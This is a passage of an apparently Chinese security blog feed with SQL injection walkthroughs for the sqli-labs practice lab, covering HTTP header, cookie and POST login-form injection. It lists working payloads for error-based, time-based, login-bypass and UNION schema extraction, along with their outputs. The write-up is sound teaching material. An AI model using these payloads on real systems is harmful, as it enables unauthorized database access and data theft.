class="string">&#x27;&#x27;</span><span class="keyword">and</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>,<span class="string">&#x27;me&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> temp;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> uname <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> <span class="keyword">user</span>  <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> green <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span> me    <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> me    <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>另一个 payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and updatexml(1,concat(0x7e,(select user()),0x7e),1),1,1)#</span></span><br></pre></td></tr></table></figure><p>思想与上面有共同之处，就不再讲解。</p><p>小结： 构造 payload 两种思路</p><ol type="1"><li>只破坏（使用）该字段，闭合前单引号，使用 and来与前面的单引号组成一个字段下 and 的运算数，同时再使用一个 and '1来闭合该字段原来后单引号。</li><li>闭合该字段，再后面自己构造一个字段用来注入</li></ol><h3 id="测试布尔盲注">测试布尔盲注</h3><p>Mozilla/5.0', (select 1),(select 1)) and 1=1# 报错。</p><p>报错原因： 之前我们可以用 and 1=1 或 and 1=2 测试布尔盲注的原因是where 与 and 的连用。 'where id =1 and 1=2' 中的 and 的运算数分别为：id=1 与 1=2，二者均为布尔值。数据库遍历每条数据，查询出满足 id=1 且 1=2的数据。</p><p>而现在是 insert into 语句，and两侧要求为布尔值，而此时显然不满足，所以报 and那里的错。这里我们知道在插入语句 insert使用布尔盲注是不太好实现的。因为你没有办法通过改变你插入的 payload来改变页面报错与否。</p><p>比如：Mozilla/5.0', ((select 1) andsleep(3)),(select((if(left(version(),1)&gt;4,1,0)))))#原本正常情况下，你使用判断版本每个字符返回的真假来控制页面正常与否，而在 insert语句中，该真假只是被插入到数据库中，你并看不到它，因此页面一直显示正常。</p><p>这里没有出错点使你的页面随着你的判断字符大小变化。当然，你也可以构造随着你的判断正误而报错与否的语句，要构造的话，就需要用到一些报错，所以不知道这算布尔盲注还是算报错盲注，照我来说，还是算布尔盲注，因为报错盲注是指通过报错把敏感信息直接显示出来。</p><p>下面给出一个 payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, (select 1),(select (if(left(version(),1)&gt;5,1,0))=1 or pow(999,999)))#</span></span><br></pre></td></tr></table></figure><p>利用了 double 溢出报错与 or 的短路特性</p><p>当然，实际渗透过程中，有正规的报错注入点，我们就不用测布尔盲注了。我这里自己构造 payload 只是因为构造有效的 payload 让人快乐，haha</p><p>这里我遇到一个博文写的 User-agent注入，使用正常的布尔盲注。要是数据库语句也是 insert into的话，那就奇怪了。当然，咱也不知道 sql 语句是啥，给出链接仅供参考。</p><p><ahref="https://medium.com/@frostnull/sql-injection-through-user-agent-44a1150f6888">SQLinjection through User-Agent</a></p><h3 id="测试时间盲注">测试时间盲注</h3><p>构造 payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, ((select 1) and sleep(3)),(select 1)) #</span></span><br></pre></td></tr></table></figure><p>延时成功</p><p>下面给出后续时间盲注 payload 示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, (select 1),(select((if(left(version(),1)&gt;5,1,sleep(3))))))#</span></span><br></pre></td></tr></table></figure><h1 id="referer-注入">referer 注入</h1><h2 id="简介">简介</h2><blockquote><p>HTTP 来源地址（<strong>referer</strong>，或 <strong>HTTPreferer</strong>）是 HTTP表头的一个字段，用来<strong>表示从哪儿链接到目前的网页</strong>，采用的格式是URL。换句话说，借着 HTTP来源地址，目前的网页可以检查访客从哪里而来，这也常被用来对付伪造的跨网站请求。</p></blockquote><h2 id="检测注入点">检测注入点</h2><p>这一步不进行了，因为都知道是 referer 注入了。</p><p>目前来看，检测注入点顺序：地址栏-&gt;搜索栏-&gt;登录栏-&gt;http头部（User-Agent-&gt;referer-&gt;cookie）</p><h2 id="检测注入类型">检测注入类型</h2><p>加个单引号，raw 中回显报错：</p><p>You have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear '192.168.107.1')' at line 1</p><p>注：repeater 中的 raw 和 render 要对比着看，正如前面所说，raw中有些字符不显示。</p><p>render 中查看，</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/less19_render.png"alt="render" /><figcaption aria-hidden="true">render</figcaption></figure><p>说明存在注入，根据 render 的页面我们就可以更加清楚地判断后台 sql查询语句。</p><p>于是我们知道 referer、ip两个字段，并且它们分别用单引号包裹。这样我们可以沿用 user agent的注入思路：只使用（破坏）该注入字段（即：referer ）或者闭合referer，使用其后面的字段。</p><p>下面测试三种盲注。</p><h3 id="测试报错注入-1">测试报错注入</h3><h4 id="检测版本">检测版本</h4><p>根据上面只使用（破坏）一个字段的思想，而且也只有一个字段让我们用，构造一下paylaod</p><p>payload（加在 referer 后面）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,(extractvalue(1,concat(0x23,(select version()))))) #</span></span><br></pre></td></tr></table></figure><p>回显：XPATH syntax error: '#5.5.53' 成功了，报错注入可行成功</p><h3 id="测试延时注入">测试延时注入</h3><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,(select 1 from (select sleep(20))a)) #</span></span><br></pre></td></tr></table></figure><p>根据人对返回时间的感觉，当然，burp 的 repeater可以看响应时间，在右下角，写着多少毫秒呢。延时注入成功。</p><h3 id="测试布尔注入">测试布尔注入</h3><p>布尔注入的情况与前面 insert user agent 一样。</p><h1 id="cookie-注入">cookie 注入</h1><h2 id="简介-1">简介</h2><blockquote><p>cookie 就是浏览器储存在用户电脑上的一小段文本文件。cookie是纯文本格式，不包含任何可执行的代码。一个 Web页面或服务器告知浏览器按照一定规范来储存这些信息，并在随后的请求中将这些信息发送至服务器，Web服务器就可以使用这些信息来识别不同的用户。大多数需要登录的网站在用户验证成功之后都会设置一个cookie，只要这个 cookie存在并可以，用户就可以自由浏览这个网站的任意页面。再次说明，cookie只包含数据，就其本身而言并不有害。</p></blockquote><p>cookie 注入</p><p>首先使用正确的用户名与密码登录，此时我们获得 cookie ：uname=admin</p><p>下面对 cookie 进行注入，与上面注入类似，下面给出 payload 示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span></span><br></pre></td></tr></table></figure><p>cookie 注入需要注意一点：cookie 的格式：name=value，比如这里：cookie就是 uname=后面一堆。</p><p>sqli-lab 第 21 关：我们查看 cookie可以看到，明显是被编码了的，因此，我们猜测编码方式为 base64，（为什么猜测是它呢？1. 常用 2. 经验），然后和 20关相同，只是我们构造完 cookie 的 payload，用 base64 编码一下就好了。</p><p>sqli-lab 第 22 关：有了 21 关的基础，我们先解密抓包或在开发者工具找的cookie，然后进行检测加一个单引号，不报错，换成双引号，报错如下：</p><blockquote><p><strong>Issue with your mysql: You have an error in your SQL syntax;check the manual that corresponds to your MySQL server version for theright syntax to use near '"admin"" LIMIT 0,1' at line 1</strong></p></blockquote><p>于是我们可以知道 cookie 由双引号包裹。其余的和 21 关一样。</p><h1 id="总结回顾">总结回顾</h1><ol type="1"><li><p>工具的缺点：hackbar 不能用 referer 头，burp suite repeater 的 raw中不显示一些特定字符，需要同时参考 render。</p></li><li><p>chrome 推荐使用谷歌商店里那个，图标为黑色底色有一个白色 H 的hackbar （Offered by: 0140454）可以修改 referer，挺好。</p></li><li><p>hackbar 有 burp 插件了，在 github上可以找到，这样有完美了，可以只使用一种工具了：浏览器（hackbar浏览器插件）或 burp+hackbar（burp 插件）来测试。其中 hackbar浏览器插件的添加 header时，可以直接输入名来搜索，然后选择就行。</p></li></ol><p>参考资料：</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/27553821">浅谈 http头注入(附案例)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>对检测注入点的小想法</title>
      <link href="/blog/2019/07/29/websec/sql_injection/View%20of%20the%20injection%20point/"/>
      <url>/blog/2019/07/29/websec/sql_injection/View%20of%20the%20injection%20point/</url>
      
        <content type="html"><![CDATA[<h1 id="less-2">less 2</h1><h2 id="检测注入点">检测注入点</h2><p>首先先用单引号，检测注入点。首先我们需要知道我们在 id=1后面加东西的目的是什么？是为了判断系统是否会混淆数据与代码，将我们输入的<strong>在某种情况下</strong>本可以作为代码执行的符号怎么处理？</p><p>当然处理方式不外乎两种</p><ol type="1"><li>通过转义、检测关键字等手段将代码转换为无害的数据</li><li>处理不当，还有一部分可以被当做代码执行，我们 sql注入便是源自于此。</li></ol><p>为什么很多人都说先用单引号判断注入点呢，我认为是因为 id=1 、id= '1'、id=('1')的开发语句用的比较多，通过单引号以及报错可以明确地区分它们。</p><p>比如三种报错：' LIMIT 0,1、'1'' LIMIT 0,1、'1'') LIMIT 0,1</p><p>如果使用左括号呢？id=('1)')</p><p>id=1 、id= '1' 、id=('1') 分别报错：) LIMIT 0,1、'1)' LIMIT0,1、Unknown column 'id' in 'where clause'.</p><p>这样也比较容易区分, 但是，（在 less 3中使用有引号竟然正常返回，我要吐了..）经过一阵折腾，我发现这样一条语句：SELECT * FROM users WHERE id=('1)') LIMIT 0,1;</p><p>在我物理环境 mysql 8.0 时报错的，然而，在 less 2 处的环境（mysql5.3）确实可以正常执行的。不同版本对 () 的处理不尽相同呀。</p><p>嗯，想必大神们也是知道这个，所以才不会用右括号什么的检测注入点吧。</p><p>在这里探讨这个，主要是想解决一下从入门学习以来的一个疑问：为什么使用单引号探测注入点的疑问。（不知道解决没有，对我来说，目前是解决了。）</p><p>回显：You have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear '' LIMIT 0,1' at line 1</p><p>可以看出报错：' LIMIT 0,1，第一个单引号显然是我们输入的那个。</p><p>由此可以猜测 sql 查询语句不是 id ='1' 的形式，因为根据 less1我们知道如果是 id = '1'，即：一般认为的字符型注入，报错应该是：'1''LIMIT 0,1，即：mysql 会把前面的 '1'也报出来，因为我们输入的单引号和它一起影响了它。</p><p>但是实际 sql 语句因该是什么样子的呢？</p><p>根据我目前的知识，我有以下两种猜测：</p><p>select * from tbl_name where id = 1</p><p>select * from tbl_name where id = ("1")</p><p>因为：</p><p>select * from tbl_name where id = ('1')</p><p>select * from tbl_name where id = (1)</p><p>如果加了单引号，这两种报错一定不是它，报错中得有个右括号才行。</p><p>这里我也不行区分什么是字符注入、什么是数字注入。根据具体情况猜测开发者用的语句，并逐一验证（或许根据经验，你知道哪种比较常用，就先验证那一种），直到证实自己的猜想为准。</p><p>或者说如果它不影响我们后面的联合查询，我们不用在乎它是什么，我们只需要知道这里<strong>存在注入点</strong>（注：要知道有注入点，别测试了半天，都没报过错，你就往后进行，哪怕是个傻子喽...），而且不用加单引号闭合前面的单引号（因为前面没有奇数个单引号），此外，还有where 子句后面还有个 limit 子句，我们需要注释掉它。</p><h1 id="less-3">less 3</h1><h2 id="检测注入点-1">检测注入点</h2><p>首先先用单引号，检测注入点。回显报错：'1'') LIMIT 0,1</p><p>猜测 sql 查询语句：select * from tbl_name where id = ('1') LIMIT0,1;</p><p>于是构造：?id=1') order by 4--+ 进行猜字段数</p><h1 id="less-4">less 4</h1><h2 id="检测注入点-2">检测注入点</h2><p>首先先用单引号，检测注入点。没有报错。这里我们要学习一个新的手法：使用双引号包裹:id = "1"</p><p>基于猜测，我们使用双引号再检测注入点，回显报错："1"") LIMIT 0,1</p><p>猜想 sql 查询语句：select * from tbl_name where id = ("1") LIMIT0,1;</p><p>构造：?id=1") order by 4 --+ 此字段</p><p>知道存在注入点后，下面就开始猜字段，爆版本、库名，然后爆所有的库，然后爆库中的表，然后爆表的字段名，然后爆数据。操作就和less-1 的一样的，这里不再细讲。</p><h1 id="总结">总结</h1><p>检测注入点</p><p>先使用单引号，看报错与否，</p><ul><li>如果报错，存在注入点，根据报错回显语句构造后续</li><li>如果不报错，换双引号，看报错与否 -如果报错，存在注入点，根据报错回显语句构造后续 - 如果不报错，换') 或 '))或 ") 或 ")) 尝试。</li></ul><p>至于为什么检测这几个闭合方式呢？因为这几个开发人员用的多，当然也不排除有些奇葩的程序员，用别的，那样如果会报错的话，根据报错提示也可以猜测。</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>对检测注入点的小想法</title>
      <link href="/blog/2019/07/29/websec/sql_injection/view_of_the_injection_point/"/>
      <url>/blog/2019/07/29/websec/sql_injection/view_of_the_injection_point/</url>
      
        <content type="html"><![CDATA[<h1 id="less-2">less 2</h1><h2 id="检测注入点">检测注入点</h2><p>首先，先用单引号，检测注入点。首先我们需要知道我们在 id=1后面加东西的目的是什么？是为了判断系统是否会混淆数据与代码，将我们输入的<strong>在某种情况下</strong>本可以作为代码执行的符号怎么处理？</p><p>当然处理方式不外乎两种</p><ol type="1"><li>通过转义、检测关键字等手段将代码转换为无害的数据</li><li>处理不当，还有一部分可以被当做代码执行，我们 sql注入便是源自于此。</li></ol><p>为什么很多人都说先用单引号判断注入点呢，我认为是因为 id=1 、id= '1'、id=('1')的开发语句用的比较多，通过单引号以及报错可以明确地区分它们。</p><p>比如三种报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; LIMIT 0,1</span><br><span class="line">&#x27;1&#x27;&#x27; LIMIT 0,1</span><br><span class="line">&#x27;1&#x27;&#x27;) LIMIT 0,1</span><br></pre></td></tr></table></figure><p>如果使用左括号呢？id=('1)')</p><p>id=1 、id= '1' 、id=('1') 分别报错：) LIMIT 0,1、'1)' LIMIT0,1、Unknown column 'id' in 'where clause'.</p><p>这样也比较容易区分, 但是，（在 less 3中使用有引号竟然正常返回，我要吐了..）经过一阵折腾，我发现这样一条语句：SELECT * FROM users WHERE id=('1)') LIMIT 0,1;</p><p>在我物理环境 mysql 8.0 时报错的，然而，在 less 2 处的环境（mysql5.3）确实可以正常执行的。不同版本对 () 的处理不尽相同呀。</p><p>嗯，想必大神们也是知道这个，所以才不会用右括号什么的检测注入点吧。</p><p>在这里探讨这个，主要是想解决一下从入门学习以来的一个疑问：为什么使用单引号探测注入点的疑问。（不知道解决没有，对我来说，目前是解决了。）</p><p>回显：You have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear '' LIMIT 0,1' at line 1</p><p>可以看出报错：' LIMIT 0,1，第一个单引号显然是我们输入的那个。</p><p>由此可以猜测 sql 查询语句不是 id ='1' 的形式，因为根据 less1我们知道如果是 id = '1'，即：一般认为的字符型注入，报错应该是：'1''LIMIT 0,1，即：mysql 会把前面的 '1'也报出来，因为我们输入的单引号和它一起影响了它。</p><p>但是实际 sql 语句因该是什么样子的呢？</p><p>根据我目前的知识，我有以下两种猜测：</p><p>select * from tbl_name where id = 1</p><p>select * from tbl_name where id = ("1")</p><p>因为：</p><p>select * from tbl_name where id = ('1')</p><p>select * from tbl_name where id = (1)</p><p>如果加了单引号，这两种报错一定不是它，报错中得有个右括号才行。</p><p>这里我也不行区分什么是字符注入、什么是数字注入。根据具体情况猜测开发者用的语句，并逐一验证（或许根据经验，你知道哪种比较常用，就先验证那一种），直到证实自己的猜想为准。</p><p>或者说如果它不影响我们后面的联合查询，我们不用在乎它是什么，我们只需要知道这里<strong>存在注入点</strong>（注：要知道有注入点，别测试了半天，都没报过错，你就往后进行，哪怕是个傻子喽...），而且不用加单引号闭合前面的单引号（因为前面没有奇数个单引号），此外，还有where 子句后面还有个 limit 子句，我们需要注释掉它。</p><h1 id="less-3">less 3</h1><h2 id="检测注入点-1">检测注入点</h2><p>首先先用单引号，检测注入点。回显报错：'1'') LIMIT 0,1</p><p>猜测 sql 查询语句：select * from tbl_name where id = ('1') LIMIT0,1;</p><p>于是构造：?id=1') order by 4--+ 进行猜字段数</p><h1 id="less-4">less 4</h1><h2 id="检测注入点-2">检测注入点</h2><p>首先先用单引号，检测注入点。没有报错。这里我们要学习一个新的手法：使用双引号包裹:id = "1"</p><p>基于猜测，我们使用双引号再检测注入点，回显报错："1"") LIMIT 0,1</p><p>猜想 sql 查询语句：select * from tbl_name where id = ("1") LIMIT0,1;</p><p>构造：?id=1") order by 4 --+ 此字段</p><p>知道存在注入点后，下面就开始猜字段，爆版本、库名，然后爆所有的库，然后爆库中的表，然后爆表的字段名，然后爆数据。操作就和less-1 的一样的，这里不再细讲。</p><h1 id="总结">总结</h1><p>检测注入点</p><p>先使用单引号，看报错与否，</p><ul><li>如果报错，存在注入点，根据报错回显语句构造后续</li><li>如果不报错，换双引号，看报错与否 -如果报错，存在注入点，根据报错回显语句构造后续 - 如果不报错，换') 或 '))或 ") 或 ")) 尝试。</li></ul><p>至于为什么检测这几个闭合方式呢？因为这几个开发人员用的多，当然也不排除有些奇葩的程序员，用别的，那样如果会报错的话，根据报错提示也可以猜测。</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>post 注入</title>
      <link href="/blog/2019/07/28/websec/sql_injection/post_injection/"/>
      <url>/blog/2019/07/28/websec/sql_injection/post_injection/</url>
      
        <content type="html"><![CDATA[<h1 id="简介">简介</h1><p>首先,了解 get 与 post 方法.</p><p><ahref="https://mp.weixin.qq.com/s?__biz=MzI3NzIzMzg3Mw==&amp;mid=100000054&amp;idx=1&amp;sn=71f6c214f3833d9ca20b9f7dcd9d33e4#rd">99%的人都理解错了HTTP 中 GET 与 POST 的区别</a></p><p><ahref="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp">HTTP方法：GET 对比 POST</a></p><p>嗯，傍大腿的感觉真好。</p><p>下面我们进入 post 注入。</p><p>所谓 post就是数据从客户端提交到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，提交到服务器后服务器再进行验证。这就是一次post 的过程的。（当然，没有上面链接讲得好）。</p><p>注意：</p><ol type="1"><li>post 和 get 的格式：前者：在 hackbar 的 post 数据框中写 参数1=值&amp;参数 2=值，后者在 url 尾部 php？参数 1=值&amp;参数 2=值。</li><li>每个 post提交数据的地方都可能存在注入点，登录框不要只关注用户名，当用户名框不行之后，再去看看密码框。</li><li>post注入其实除了位置和形式变化了一下，前面回显，报错盲注，时间盲注，布尔盲注等方法还都可以用。</li></ol><h1 id="流程">流程</h1><p>此流程为注入 less 11 的流程。</p><h2 id="熟悉页面">熟悉页面</h2><p>大致浏览一下页面，用正确密码登录看看登录成功与登录失败的样子。</p><p>先熟悉一下，有利于后面更好的进行注入。</p><h2 id="检测注入点">检测注入点</h2><p>先测试用户名登录栏有无 post 注入： 万能密码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27; #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>测试成功</p><h2 id="猜字段数">猜字段数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27; order by 2 #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>2 个字段</p><h2 id="查显示位">查显示位</h2><p>注意查显示位的时候，通过加符号等，使得前面的查询无果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-admin<span class="string">&#x27; union select 1,2 #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>回显：</p><blockquote><p>Your Login name:1 Your Password:2</p></blockquote><p>两个显示位都有</p><h2 id="数据库版本数据库名">数据库版本,数据库名</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-admin<span class="string">&#x27; union select database(),version() #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>回显：</p><blockquote><p>Your Login name:security Your Password:5.5.53</p></blockquote><h2 id="所有数据库">所有数据库</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-admin<span class="string">&#x27; union select 1,group_concat(schema_name) from information_schema.schemata #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>回显：</p><blockquote><p>YourPassword:information_schema,challenges,mysql,performance_schema,security,webug,webug_sys,webug_width_byte</p></blockquote><h2 id="当前数据库下的表">当前数据库下的表</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-admin<span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>回显：</p><blockquote><p>Your Password:emails,referers,uagents,users</p></blockquote><p>less 11 到此为止。</p><h1 id="less-13">less 13</h1><p>为什么还有讲一下 less 13 呢？感觉自己从 less 13里面学到一点不知道的东西，所以要提一下。less 13 也是 post注入，流程与上面大致相同，不再赘述，只讲几个关键的步骤。</p><h2 id="检测注入点-1">检测注入点</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27;&amp;passwd=admin</span></span><br></pre></td></tr></table></figure><p>回显：</p><blockquote><p>You have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear 'admin') LIMIT 0,1' at line 1</p></blockquote><p>回显报错：admin') LIMIT0,1，根据回显猜测：id=(1)，然后使用：uname=admin) &amp;passwd=admin测试不报错，奇怪，怎么会呢？根据报错来看，就应该是这样呀？于是我去看源码并查资料，这才明白，有个知识点自己没有掌握（单、双引号）：</p><p><strong>如果你要想在字段中包含单引号，插入的时候要使用两个单引号。mysql的字符串/字段中的两个单引号会被当做一个单引号。</strong></p><p>首先要知道，这是 mysql 的问题，不是 php 或其他的问题，下面在 mysql控制台进行复现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where username=(&#x27;admin&#x27;&#x27;) and password=(&#x27;admin&#x27;) limit 0,</span><br><span class="line">1;</span><br><span class="line">    &#x27;&gt; &#x27;;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your</span><br><span class="line">MySQL server version for the right syntax to use near &#x27;admin&#x27;) limit 0,1;</span><br><span class="line">&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>当然，此报错最后还有两个引号，因为有一个引号是我为了匹配前面的一个单引号而加（否则不能执行），而我猜测 php 则是将自己组合的 sql 强制执行，所以它少了一个单引号。</p><p>上面的话，不理解不要紧，请看下面这个博文。</p><p><ahref="https://blog.csdn.net/u010566813/article/details/51864375">Mysql中的单引号，双引号，反引号</a></p><p>下面我使用 mysql 5.5.5. 进一步证实我的说法。</p><p>下面是一张表中的原始数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb     <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angelina <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Dummy    <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> secure   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> stupid   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">6</span> <span class="operator">|</span> superman <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7</span> <span class="operator">|</span> batman   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span> admin    <span class="operator">|</span> admin#   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">9</span> <span class="operator">|</span> admin1   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span> admin2   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span> admin3   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span> dhakkan  <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">14</span> <span class="operator">|</span> admin4   <span class="operator">|</span> <span class="number">11</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">13</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>下面我插入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users <span class="keyword">values</span>(<span class="number">13</span>,<span class="string">&#x27;admin&#x27;&#x27;&#x27;</span>,<span class="string">&#x27;passwd&#x27;</span>);</span><br></pre></td></tr></table></figure><p>让你看看效果，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into users values(13,&#x27;admin&#x27;&#x27;&#x27;,&#x27;passwd&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | 11       |</span><br><span class="line">|  2 | Angelina | 11       |</span><br><span class="line">|  3 | Dummy    | 11       |</span><br><span class="line">|  4 | secure   | 11       